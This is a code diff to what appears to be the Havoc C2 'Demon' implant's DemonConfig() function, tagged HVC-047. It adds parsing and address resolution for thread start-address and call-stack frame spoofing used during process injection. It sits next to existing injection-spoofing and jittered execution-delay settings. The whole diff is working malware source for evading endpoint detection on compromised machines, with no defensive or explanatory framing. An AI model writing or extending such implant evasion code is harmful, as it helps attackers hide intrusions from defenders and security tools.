@@ -794,6 +794,25 @@ VOID DemonConfig()
     PCHAR  InjectSpoofLib    = NULL;
     PCHAR  InjectSpoofFunc   = NULL;
     UINT32 InjectSpoofOffset = 0;
+    /* HVC-047: stack spoof start address */
+    UINT32 SsStartLen      = 0;
+    PCHAR  SsStartLib      = NULL;
+    PCHAR  SsStartFunc     = NULL;
+    INT32  SsStartOffset   = 0;
+    /* HVC-047: stack spoof frame addresses */
+    UINT32 SsFrameLen      = 0;
+    PCHAR  SsFrame0Lib     = NULL;
+    PCHAR  SsFrame0Func    = NULL;
+    INT32  SsFrame0Offset  = 0;
+    PCHAR  SsFrame1Lib     = NULL;
+    PCHAR  SsFrame1Func    = NULL;
+    INT32  SsFrame1Offset  = 0;
+    PCHAR  SsFrame2Lib     = NULL;
+    PCHAR  SsFrame2Func    = NULL;
+    INT32  SsFrame2Offset  = 0;
+    PCHAR  SsFrame3Lib     = NULL;
+    PCHAR  SsFrame3Func    = NULL;
+    INT32  SsFrame3Offset  = 0;
 
     PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )
 
@@ -891,6 +910,41 @@ VOID DemonConfig()
     /* HVC-046: jittered delay between injection stages (alloc -> protect -> execute) */
     Instance->Config.Implant.ExecDelay       = (DWORD)ParserGetInt32( &Parser );
     Instance->Config.Implant.ExecDelayJitter = (DWORD)ParserGetInt32( &Parser );
+
+    /* HVC-047: stack spoof start address (TEB.Win32StartAddress target) */
+    SsStartLib    = ParserGetString( &Parser, &SsStartLen );
+    if ( SsStartLen <= 1 || !SsStartLib[0] ) SsStartLib = NULL;
+    SsStartFunc   = ParserGetString( &Parser, &SsStartLen );
+    if ( SsStartLen <= 1 || !SsStartFunc[0] ) SsStartFunc = NULL;
+    SsStartOffset = ParserGetInt32( &Parser );
+
+    /* HVC-047: stack spoof frame 0 */
+    SsFrame0Lib   = ParserGetString( &Parser, &SsFrameLen );
+    if ( SsFrameLen <= 1 || !SsFrame0Lib[0] ) SsFrame0Lib = NULL;
+    SsFrame0Func  = ParserGetString( &Parser, &SsFrameLen );
+    if ( SsFrameLen <= 1 || !SsFrame0Func[0] ) SsFrame0Func = NULL;
+    SsFrame0Offset = ParserGetInt32( &Parser );
+
+    /* HVC-047: stack spoof frame 1 */
+    SsFrame1Lib   = ParserGetString( &Parser, &SsFrameLen );
+    if ( SsFrameLen <= 1 || !SsFrame1Lib[0] ) SsFrame1Lib = NULL;
+    SsFrame1Func  = ParserGetString( &Parser, &SsFrameLen );
+    if ( SsFrameLen <= 1 || !SsFrame1Func[0] ) SsFrame1Func = NULL;
+    SsFrame1Offset = ParserGetInt32( &Parser );
+
+    /* HVC-047: stack spoof frame 2 */
+    SsFrame2Lib   = ParserGetString( &Parser, &SsFrameLen );
+    if ( SsFrameLen <= 1 || !SsFrame2Lib[0] ) SsFrame2Lib = NULL;
+    SsFrame2Func  = ParserGetString( &Parser, &SsFrameLen );
+    if ( SsFrameLen <= 1 || !SsFrame2Func[0] ) SsFrame2Func = NULL;
+    SsFrame2Offset = ParserGetInt32( &Parser );
+
+    /* HVC-047: stack spoof frame 3 */
+    SsFrame3Lib   = ParserGetString( &Parser, &SsFrameLen );
+    if ( SsFrameLen <= 1 || !SsFrame3Lib[0] ) SsFrame3Lib = NULL;
+    SsFrame3Func  = ParserGetString( &Parser, &SsFrameLen );
+    if ( SsFrameLen <= 1 || !SsFrame3Func[0] ) SsFrame3Func = NULL;
+    SsFrame3Offset = ParserGetInt32( &Parser );
 
 #ifdef TRANSPORT_HTTP
     Instance->Config.Implant.DownloadChunkSize  = 0x80000; /* 512k */
@@ -1131,6 +1185,63 @@ VOID DemonConfig()
             }
         }
     }
+
+    /* HVC-047: resolve stack spoof start address (TEB.Win32StartAddress target) */
+    if ( SsStartLib && SsStartFunc ) {
+        PVOID hMod = LdrModuleLoad( SsStartLib );
+        if ( hMod ) {
+            PVOID Fn = LdrFunctionAddr( hMod, HashStringA( SsStartFunc ) );
+            if ( Fn )
+                Instance->Config.Implant.InjSpoofStartAddr = (PVOID)( (ULONG_PTR)Fn + SsStartOffset );
+        }
+        PRINTF( "InjSpoofStartAddr: %s!%s+0x%x -> %p\n", SsStartLib, SsStartFunc, SsStartOffset, Instance->Config.Implant.InjSpoofStartAddr )
+    }
+
+    /* HVC-047: resolve stack spoof frame 0 */
+    if ( SsFrame0Lib && SsFrame0Func ) {
+        PVOID hMod = LdrModuleLoad( SsFrame0Lib );
+        if ( hMod ) {
+            PVOID Fn = LdrFunctionAddr( hMod, HashStringA( SsFrame0Func ) );
+            if ( Fn )
+                Instance->Config.Implant.InjSpoofFrame[0] = (PVOID)( (ULONG_PTR)Fn + SsFrame0Offset );
+        }
+    }
+
+    /* HVC-047: resolve stack spoof frame 1 */
+    if ( SsFrame1Lib && SsFrame1Func ) {
+        PVOID hMod = LdrModuleLoad( SsFrame1Lib );
+        if ( hMod ) {
+            PVOID Fn = LdrFunctionAddr( hMod, HashStringA( SsFrame1Func ) );
+            if ( Fn )
+                Instance->Config.Implant.InjSpoofFrame[1] = (PVOID)( (ULONG_PTR)Fn + SsFrame1Offset );
+        }
+    }
+
+    /* HVC-047: resolve stack spoof frame 2 */
+    if ( SsFrame2Lib && SsFrame2Func ) {
+        PVOID hMod = LdrModuleLoad( SsFrame2Lib );
+        if ( hMod ) {
+            PVOID Fn = LdrFunctionAddr( hMod, HashStringA( SsFrame2Func ) );
+            if ( Fn )
+                Instance->Config.Implant.InjSpoofFrame[2] = (PVOID)( (ULONG_PTR)Fn + SsFrame2Offset );
+        }
+    }
+
+    /* HVC-047: resolve stack spoof frame 3 */
+    if ( SsFrame3Lib && SsFrame3Func ) {
+        PVOID hMod = LdrModuleLoad( SsFrame3Lib );
+        if ( hMod ) {
+            PVOID Fn = LdrFunctionAddr( hMod, HashStringA( SsFrame3Func ) );
+            if ( Fn )
+                Instance->Config.Implant.InjSpoofFrame[3] = (PVOID)( (ULONG_PTR)Fn + SsFrame3Offset );
+        }
+    }
+
+    PRINTF( "InjSpoofFrames: [%p] [%p] [%p] [%p]\n",
+        Instance->Config.Implant.InjSpoofFrame[0],
+        Instance->Config.Implant.InjSpoofFrame[1],
+        Instance->Config.Implant.InjSpoofFrame[2],
+        Instance->Config.Implant.InjSpoofFrame[3] )
 
     ParserDestroy( &Parser );
 }
